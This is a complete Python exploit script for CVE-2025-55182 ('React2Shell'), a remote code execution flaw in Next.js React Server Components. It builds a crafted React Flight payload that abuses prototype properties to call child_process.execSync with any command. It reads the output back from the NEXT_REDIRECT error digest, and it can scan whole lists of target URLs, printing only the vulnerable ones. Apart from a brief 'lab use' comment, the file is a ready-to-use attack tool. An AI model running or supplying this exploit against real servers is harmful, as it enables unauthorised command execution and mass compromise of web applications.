#!/usr/bin/env python3
# poc.py
# Purpose: React2Shell PoC for CVE-2025-55182 (Next.js / React Server Components)
# Notes:
#   - Sends a crafted React Flight payload to trigger RCE via Server Actions.
#   - Extracts command output from the NEXT_REDIRECT digest when successful.
#   - For lab / educational use only.
# Version 1.3.0
import argparse
import requests
import urllib3
import sys
import json
from pathlib import Path

# Disable SSL warnings (use --insecure for HTTPS labs)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors
GREEN  = "\033[92m"
RED    = "\033[91m"
CYAN   = "\033[96m"
YELLOW = "\033[93m"
RESET  = "\033[0m"


def build_payload(executable: str) -> dict:
    """Build crafted chunk structure for React Flight exploitation."""
    # Very small sanity escape for single quotes inside the command
    safe_exec = executable.replace("'", "\\'")
    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            # Throws NEXT_REDIRECT with the command output inside `digest`
            "_prefix": (
                "var res = process.mainModule.require('child_process').execSync('" 
                + safe_exec + 
                "',{'timeout':5000}).toString().trim(); " 
                "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});"
            ),
            # If you don't need the command output, this could be simplified to just execSync(...)
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }

    files = {
        "0": (None, json.dumps(crafted_chunk)),
        "1": (None, '"$@0"'),
    }

    return files


def extract_digest(body: str):
    """Best-effort extraction of the `digest` field from the server error body."""
    key = '"digest":"'
    idx = body.find(key)
    if idx == -1:
        return None
    start = idx + len(key)
    end = body.find('"', start)
    if end == -1:
        return None
    return body[start:end]


def test_url(base_url: str, cmd: str, timeout: int, verify_tls: bool, output_file=None, quiet=False):
    """Test a single URL with the exploit."""
    if not quiet:
        print(f"{CYAN}[+] Target URL :{RESET} {base_url}")
        print(f"{CYAN}[+] Command    :{RESET} {cmd}\n")

    files = build_payload(cmd)
    headers = {"Next-Action": "x"}

    if not quiet:
        print(f"{CYAN}[+] Sending crafted Flight payload...{RESET}")

    try:
        res = requests.post(
            base_url,
            files=files,
            headers=headers,
            timeout=timeout,
            verify=verify_tls,
        )
    except Exception as e:
        if not quiet:
            print(f"{RED}[X] Request failed:{RESET} {e}\n")
        return False

    if not quiet:
        print(f"{CYAN}[+] HTTP status:{RESET} {res.status_code}\n")

    body = res.text

    # Try to extract digest (command output)
    digest = extract_digest(body)
    if digest:
        # Always show vulnerable targets, even in quiet mode
        if quiet:
            print(f"{GREEN}[VULNERABLE]{RESET} {base_url}")
            print(f"{GREEN}Output:{RESET} {digest}\n")
        else:
            print(f"{GREEN}[✓] RCE confirmed. Command output:{RESET}\n")
            print(f"    {digest}\n")
        success = True
    else:
        if not quiet:
            print(f"{YELLOW}[!] No digest field found in response body.{RESET}")
            print(f"{YELLOW}[!] Raw body (truncated to 800 chars):{RESET}\n")
            print(body[:800] + ("..." if len(body) > 800 else ""))
            print()
        success = False

    # Optional output file
    if output_file:
        out_path = Path(output_file)
        try:
            mode = "a" if out_path.exists() else "w"
            with open(out_path, mode, encoding="utf-8") as f:
                f.write(f"{'='*60}\n")
                f.write(f"URL: {base_url}\n")
                f.write(f"Command: {cmd}\n")
                f.write(f"Status: {res.status_code}\n")
                f.write(f"Success: {success}\n\n")
                if digest:
                    f.write(f"Output: {digest}\n\n")
                f.write(f"Raw Response:\n{body}\n\n")
            if not quiet:
                print(f"{GREEN}[✓] Response appended to:{RESET} {out_path}\n")
        except Exception as e:
            if not quiet:
                print(f"{RED}[X] Failed to write output file:{RESET} {e}\n")
    
    return success


def read_urls_from_file(file_path: str):
    """Read URLs from a file, one per line, ignoring empty lines and comments."""
    urls = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                # Skip empty lines and comments
                if line and not line.startswith('#'):
                    urls.append(line)
    except Exception as e:
        print(f"{RED}[X] Failed to read URL list file:{RESET} {e}")
        sys.exit(1)
    return urls


def main():
    parser = argparse.ArgumentParser(
        description="React2Shell PoC for CVE-2025-55182 (Next.js / React Server Components)",
        epilog=(
            "Examples:\n"
            "  python3 poc.py -u http://localhost:3000 -c 'id'\n"
            "  python3 poc.py -u https://target.com -c 'whoami' --insecure\n"
            "  python3 poc.py -l urls.txt -c 'uname -a' -o results.txt\n"
            "  python3 poc.py -l targets.txt -c 'id' --insecure\n"
            "  python3 poc.py -l urls.txt -c 'id' -q  # Quiet mode, only show vulnerable\n"
        ),
        formatter_class=argparse.RawTextHelpFormatter,
    )

    # Make url and list mutually exclusive
    url_group = parser.add_mutually_exclusive_group(required=True)
    url_group.add_argument(
        "-u", "--url",
        help="Base URL of the vulnerable Next.js app (e.g. http://localhost:3000)",
    )
    url_group.add_argument(
        "-l", "--list",
        help="File containing list of URLs to test (one per line)",
    )

    parser.add_argument(
        "-c", "--cmd", default="id",
        help="Command to execute on the target (default: id)",
    )
    parser.add_argument(
        "-T", "--timeout", type=int, default=10,
        help="HTTP timeout in seconds (default: 10)",
    )
    parser.add_argument(
        "-k", "--insecure", action="store_true",
        help="Disable TLS verification (useful for HTTPS labs)",
    )
    parser.add_argument(
        "-o", "--output",
        help="Optional output file to store results (txt)",
    )
    parser.add_argument(
        "-q", "--quiet", action="store_true",
        help="Quiet mode: only display vulnerable targets",
    )

    args = parser.parse_args()

    verify_tls = not args.insecure

    if not args.quiet:
        print(f"{CYAN}React2Shell PoC - CVE-2025-55182{RESET}")
        print(f"{CYAN}---------------------------------{RESET}\n")

    # Determine if testing single URL or multiple
    if args.url:
        urls = [args.url.strip()]
    else:
        if not args.quiet:
            print(f"{CYAN}[+] Reading URLs from:{RESET} {args.list}\n")
        urls = read_urls_from_file(args.list)
        if not args.quiet:
            print(f"{CYAN}[+] Loaded {len(urls)} URL(s){RESET}\n")

    if not urls:
        print(f"{RED}[X] No URLs to test!{RESET}")
        sys.exit(1)

    # Test each URL
    results = {"success": 0, "failed": 0}
    
    for i, url in enumerate(urls, 1):
        if len(urls) > 1 and not args.quiet:
            print(f"{CYAN}{'='*60}{RESET}")
            print(f"{CYAN}[{i}/{len(urls)}] Testing URL{RESET}\n")
        
        success = test_url(
            base_url=url,
            cmd=args.cmd,
            timeout=args.timeout,
            verify_tls=verify_tls,
            output_file=args.output,
            quiet=args.quiet
        )
        
        if success:
            results["success"] += 1
        else:
            results["failed"] += 1

    # Print summary if testing multiple URLs
    if len(urls) > 1 and not args.quiet:
        print(f"{CYAN}{'='*60}{RESET}")
        print(f"{CYAN}Summary:{RESET}")
        print(f"  {GREEN}Successful: {results['success']}{RESET}")
        print(f"  {RED}Failed: {results['failed']}{RESET}")
        print(f"  Total: {len(urls)}\n")


if __name__ == "__main__":
    main()
